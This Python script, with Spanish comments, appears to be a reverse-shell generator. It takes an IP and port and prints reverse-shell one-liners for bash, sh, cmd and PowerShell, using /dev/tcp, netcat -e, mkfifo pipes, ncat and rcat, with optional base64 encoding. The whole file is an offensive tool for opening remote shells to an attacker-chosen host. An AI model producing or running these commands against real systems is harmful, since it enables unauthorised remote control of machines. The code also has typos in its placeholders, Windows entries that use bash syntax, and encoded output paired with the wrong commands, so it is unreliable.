import argparse, base64
from colorama import init, Fore

# Confihgurar los colores
init()
GREEN = Fore.GREEN
RED = Fore.RED
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET

#   Configurar parametros para el script
parser = argparse.ArgumentParser(description='generar shells')
parser.add_argument('-i', '--ip', required=True, help='IP del servidor')
parser.add_argument('-p', '--port', required=True, help='Puerto del servidor')
parser.add_argument('--type', choices=['bash', 'sh', 'cmd', 'powershell'], help='Tipo de shell a filtrar')
parser.add_argument('-r', '--full_path', action='store_true', help='Aregar la ruta completa de las shells')
parser.add_argument('-d', '--decode', action='store_true', help='codificar a base64')
args = parser.parse_args()

# Funciones para las shells

def bash_shells(ip, port, full):
    if full:
        return [
           '/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1',
           '0<&196;exec 196<>/dev/tcp/{ip}/{port}; /bin/bash <&196 >&196 2>&196',
           'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done',
           '/bin/bash -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5',
           '/bin/bash -i >& /dev/udp/{ip}/{port} 0>&1',
           'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f',
           'nc {ip} {port} -e /bin/bash',
           'nc -c /bin/bash {ip} {port}',
           'ncat {ip} {por} -e /bin/bash',
           'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|ncat -u {ip} {port} >/tmp/f',
           'rcat {ip} {port} -r /bin/bash'
        ]
    else:
        return [
            'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
            '0<&196;exec 196<>/dev/tcp/{ip}/{port}; bash <&196 >&196 2>&196',
            'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done',
            'bash -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5',
            'bash -i >& /dev/udp/{ip}/{port} 0>&1',
            'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f',
            'nc {ip} {port} -e bash',
            'nc -c bash {ip} {port}',
            'ncat {ip} {port} -e bash',
            'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|ncat -u {ip} {port} >/tmp/f',
            'rcat {ip} {port} -r bash'
        ]

def sh_shells(ip, port, full):
    if full:
        return[
            '/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1',
            '0<&196;exec 196<>/dev/tcp/{ip}/{port}; /bin/sh <&196 >&196 2>&196',
            'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done',
            '/bin/sh -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5',
            '/bin/sh -i >& /dev/udp/{ip}/{port} 0>&1',
            'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',
            'nc {ip} {port} -e /bin/sh',
            'nc -c /bin/sh {ip} {port}',
            'ncat {ip} {port} -e /bin/sh',
            'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat -u {ip} {port} >/tmp/f',
            'rcat {ip} {port} -r /bin/sh'
        ]
    else:
        return[
            'sh -i >& /dev/tcp/{ip}/{port} 0>&1',
            '0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196',
            'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done',
            'sh -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5',
            'sh -i >& /dev/udp/{ip}/{potr} 0>&1',
            'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f',
            'nc {ip} {port} -e sh',
            'nc -c sh {ip} {port}',
            'ncat {ip} {port} -e sh',
            'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u {ip} {port} >/tmp/f',
            'rcat {ip} {port} -r sh'
        ]
    
def cmd_shells(ip, port):
    return[
        'cmd -i >& /dev/tcp/{ip}/{port} 0>&1',
        '0<&196;exec 196<>/dev/tcp/{ip}/{port}; cmd <&196 >&196 2>&196',
        'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done',
        'cmd -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5',
        'cmd -i >& /dev/udp/{ip}/{port} 0>&1',
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cmd -i 2>&1|nc {ip} {port} >/tmp/f',
        'nc {ip} {port} -e cmd',
        'nc -c cmd {ip} {port}',
        'ncat {ip} {port} -e cmd',
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cmd -i 2>&1|ncat -u {ip} {port} >/tmp/f',
        'rcat {ip} {port} -r cmd'
    ]

def powershell_shells(ip, port):
    return[
        'ncat.exe {ip} {port} -e powershell',
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|powershell -i 2>&1|ncat -u {ip} {port} >/tmp/f',
        'rcat {ip} {port} -r powershell'
    ]

def encode_shells(ip, port, full):
    shells = []
    if full:
        shells += bash_shells(ip, port, full)
        shells += sh_shells(ip, port, full)
    else:
        shells += bash_shells(ip, port, full)[1:]
        shells += sh_shells(ip, port, full)[1:]
    shells += cmd_shells(ip, port)
    shells += powershell_shells(ip, port)
    encoded_shells = []
    for shell in shells:
        encoded_shell = base64.b64encode(shell.encode('utf-8')).decode('utf-8')
        encoded_shells.append(encoded_shell)
    return encoded_shells

# Reemplazar IP y puerto en cada shell y mostrar el resultado
ip_shell = args.ip
port_shell = args.port
full = args.full_path
encoded = args.decode

if args.type == 'bash':
    shells = bash_shells(ip_shell, port_shell, full)
elif args.type == 'sh':
    shells = sh_shells(ip_shell, port_shell, full)
elif args.type == 'cmd':
    shells = cmd_shells(ip_shell, port_shell)
elif args.type == 'powershell':
    shells = powershell_shells(ip_shell, port_shell)
else:
    shells = sh_shells(ip_shell, port_shell, full) + \
        bash_shells(ip_shell, port_shell, full)


if encoded:
    encoded_shells = encode_shells(ip_shell, port_shell, full)
    for i, shell in enumerate(shells):
        print('\n')
        print(GREEN + '[+] ' + RESET + shell.replace('{ip}', RED + ip_shell + RESET).replace('{port}', BLUE + port_shell + RESET))
        print(CYAN + '   Encoded: ' + RESET + encoded_shells[i] + '\n')
else:
    for shell in shells:
        print('\n')
        print(GREEN + '[+] ' + RESET + shell.replace('{ip}', RED + ip_shell + RESET).replace('{port}', BLUE + port_shell + RESET) + '\n')